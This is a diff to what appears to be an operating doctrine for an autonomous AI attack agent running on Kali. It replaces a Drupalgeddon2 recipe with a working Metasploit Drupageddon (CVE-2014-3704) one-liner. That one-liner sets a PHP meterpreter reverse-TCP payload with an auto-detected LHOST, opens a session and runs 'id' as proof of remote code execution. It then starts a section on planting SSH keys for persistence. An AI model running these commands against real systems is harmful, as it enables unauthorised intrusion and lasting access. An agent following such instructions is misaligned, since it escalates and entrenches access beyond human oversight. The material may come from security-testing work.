@@ -417,33 +417,30 @@ If recon turns up a Drupal site (a web root with `CHANGELOG.txt`, a
 `sites/default` tree, a `/user/login` page, or a directory listing that smells
 like Drupal), READ ITS VERSION off whatever your own recon turned up — the first
 line of `CHANGELOG.txt`, the page's generator meta, or the listing itself. WHICH
-version is running is a FACT ABOUT THE BOX you read, never a given. Drupalgeddon2
-(CVE-2018-7600) hits Drupal 7.x before 7.58; confirm the box is in that range
-before reaching for it. (Drupal 8.x is also named by this CVE upstream, but this
-doctrine is scoped to the concretely-verified 7.x evidence path only — don't
-reach for this module against an 8.x box.)
+version is running is a FACT ABOUT THE BOX you read, never a given. Metasploit's
+real `drupal_drupageddon` module (CVE-2014-3704, "Drupageddon" — a pre-auth SQLi
+that poisons Drupal's own cache to get RCE) covers Drupal 7.0 through 7.31
+(fixed in 7.32); confirm the box is in that range before reaching for it.
 
 IF — and only if — recon confirms a vulnerable Drupal 7.x version, turn it into
-command execution with Metasploit's real drupalgeddon2 module. msfconsole is on
-your Kali box; drive it non-interactively through `run_on_attacker` (a cold load
-is slow — give it the one call, it has time):
-  msfconsole -q -x "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS <target>; set RPORT 80; set TARGETURI <the path your own recon found>; set TARGET 2; set PAYLOAD cmd/unix/generic; set CMD id; set AllowNoCleanup true; run"
+a real shell. msfconsole is on your Kali box; drive it non-interactively through
+`run_on_attacker` (a cold load is slow — give it the one call, it has time). This
+module needs a reverse-shell payload (not a one-shot command-dump), so your own
+attacker-box IP must be LHOST — determine it yourself in the same command, never
+hardcode it:
+  IP=$(hostname -I | cut -d" " -f1); msfconsole -q -x "use exploit/multi/http/drupal_drupageddon; set RHOSTS <target>; set TARGETURI <the path your own recon found>; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST $IP; set LPORT <a port you choose>; run -z; sessions -i 1 -c id; exit -y"
 TARGETURI MUST come from your own observed directory listing — the path Drupal is
 actually served from (`/`, `/drupal/`, whatever recon showed), never a hardcoded
-guess. RHOSTS is the target; RPORT 80 unless recon found Drupal on another port.
-TARGET 2 (Automatic Unix In-Memory) is REQUIRED — the module defaults to a PHP
-target that rejects `cmd/unix/generic` outright. AllowNoCleanup is REQUIRED too —
-this payload can't register the module's file-cleanup handler, and the module
-refuses to run without it. Both are mechanical requirements of the real module,
-not optional tuning.
+guess. `run -z` backgrounds the session the instant it opens instead of dropping
+you into an interactive meterpreter prompt your tool can't drive; the immediately
+following `sessions -i 1 -c id` runs one real command on that session and returns
+its output directly in the SAME call — no separate step needed.
 
-THE DUMPED COMMAND OUTPUT IS THE PROOF — no separate verify step this time:
-unlike the ProFTPD path (where you must curl the planted page yourself), the
-`cmd/unix/generic` payload auto-enables `DUMP_OUTPUT`, so msf echoes the target's
-real HTTP response body straight back. When the module runs `CMD id`, genuine
-`id` output (`uid=...(...)`) printed in that dumped body IS your RCE proof. msf's
-`[+] The target appears to be vulnerable` or `[*] session` lines are NOT —
-only the returned command output confirms you have execution on the target.
+THE RETURNED COMMAND OUTPUT IS THE PROOF: genuine `id` output (`uid=...(...)`)
+following `Running 'id' on meterpreter session...` IS your RCE proof. msf's
+"Meterpreter session opened" line alone is NOT — a session existing isn't the
+same as a command actually running on the target; only the returned `id` output
+confirms execution.
 
 POST-EXPLOITATION — SSH-KEY PERSISTENCE (don't just hold the door, copy the key):
 Once you have a foothold (or root), it's worth planting your own way back in —
